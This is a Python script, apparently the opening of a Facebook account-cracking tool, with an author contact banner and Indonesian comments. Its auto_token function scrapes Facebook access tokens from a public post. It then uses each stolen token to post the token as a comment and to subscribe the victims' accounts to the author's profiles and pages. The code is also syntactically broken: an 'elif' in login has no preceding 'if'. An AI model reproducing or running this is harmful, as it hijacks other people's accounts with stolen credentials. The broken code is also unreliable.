#################################################################
#         		ATHOUR : MR.Hamza			#
#  		     WHATSAPP : 03011517172			#
#		  GITHUB : github.com/ManTalStudio        	#
#	       FACEBOOK : m.facebook.com/MantalStudioo	#
#################################################################
## import list
import os,sys
try: import requests
except ModuleNotFoundError:print("Sedang Install Module requests");os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError:print("Sedang Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError:print("Sedang Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/null")

## import dalam
import requests as req
import requests as re
import time,random,json
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from random import randint
from bs4 import BeautifulSoup

import requests as ress


def exit():
	sys.exit()
	exit()





def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.009)

## import crack
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import ThreadPoolExecutor as zthreads
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor as kikygtg
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from requests.exceptions import ConnectionError

## warna public
P = '\x1b[0;97m' # PUTIH
M = '\x1b[0;91m' # MERAH
H = '\x1b[0;92m' # HIJAU.
K = '\x1b[0;93m' # KUNINg.
B = '\x1b[0;94m' # BIRU.
U = '\x1b[0;95m' # UNGU.
O = '\x1b[0;96m' # BIRU MUDA.
N = '\x1b[0m'    # WARNA MATI
I='\x1b[0;32m'
C='\x1b[0;36m'
M='\x1b[0;31m'
U='\x1b[0;35m'
K='\x1b[0;33m'
#P='\033[0;37m'
P='\x1b[00m'
H='\x1b[0;90m'
Q="\x1b[00m"
i='\x1b[0;32m'
c='\x1b[0;36m'
m='\x1b[0;31m'
u='\x1b[0;35m'
k='\x1b[0;33m'
b='\x1b[0;34m'
#P='\033[0;37m'
p='\x1b[00m'
h='\x1b[0;90m'
q="\x1b[00m"
war = (Q+"["+C+"+"+Q+"] ")
inp = (Q+"["+U+"-"+Q+"] ")
bulat = (Q+"["+C+"#"+Q+"] ")
garis = (war+"=====================================================")
#war = ("|— ")
#inp = ("|–")
#bulat = ("|-")

def login():
	os.system("clear")
	print (logo)
	jalan("\n"+war+"Sorry.. Before Continue Please Login !")
	jalan(war+"You Get Free Toke  !")
	print ("[1]Get Free Token")
	h_ = input(war+'Select :')
	elif h_ in ["1", "01", "auto"]:
		auto_token()
	else:jalan(war+"Fill Correctly");time.sleep(1);login()
def auto_token():
	ba = 0
	bi = 0
#	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=213614107297063&id=100059454248601&_rdr")

	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=180923747373969&id=100063690353340&_rdr")

#	link_token = requests.get("https://m.facebook.com/photo.php?fbid=120338706765807&id=100063690353340&set=a.116524033813941&source=11&ref=bookmarks")

#	link_token = requests.get("https://free.facebook.com/story.php?story_fbid=1714009362122228&id=100005395413800&_rdr")
	gbl = par(link_token.content,'html.parser')
#	print (gbl)
	token_free = re.findall("EAA\w+", link_token.text)
	for naa in token_free:
		ba += 1
		if len(naa)>=37:
			token = naa
			print(war+"Token Yang Ke : "+str(ba))
			post4 = ('180923747373969') # MantalStudioo
			post5 = ("172628718203472") # SAme
			requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + token + '&access_token=' + token)
			requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + token + '&access_token=' + token)
			requests.post('https://graph.facebook.com/100065699346434/subscribers?access_token=' + token) ### FB RISKY
			requests.post('https://graph.facebook.com/100047876560116/subscribers?access_token=' + token) ### FB RISKY
			requests.post('https://graph.facebook.com/100026203143466/subscribers?access_token=' + token) ### Halaman Risky
			requests.post('https://graph.facebook.com/Termuxid-Dumai-991-110877271176800/subscribers?access_token=' + token) ### Halaman Risky
			cek_token(naa)
	exit(war+"Sorry Token Not Found")